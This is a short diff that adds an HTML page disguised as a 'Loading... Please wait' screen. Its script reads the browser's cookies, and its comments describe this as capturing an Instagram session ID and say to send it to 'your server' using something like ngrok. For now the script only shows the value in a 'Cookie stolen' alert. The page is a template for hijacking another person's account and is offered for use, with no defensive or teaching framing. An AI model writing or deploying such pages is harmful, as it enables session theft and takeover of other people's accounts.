@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading...</title></head>
+<body>
+<script>
+  // This script captures the Instagram session ID
+  var cookie = document.cookie;
+  // Send it to your server (you need a simple server like ngrok or GitHub Actions for this part)
+  // For simplicity, let's just alert it for now so you can see it works:
+  alert("Cookie stolen: " + cookie);
+</script>
+<p>Please wait...</p>
+</body>
+</html>
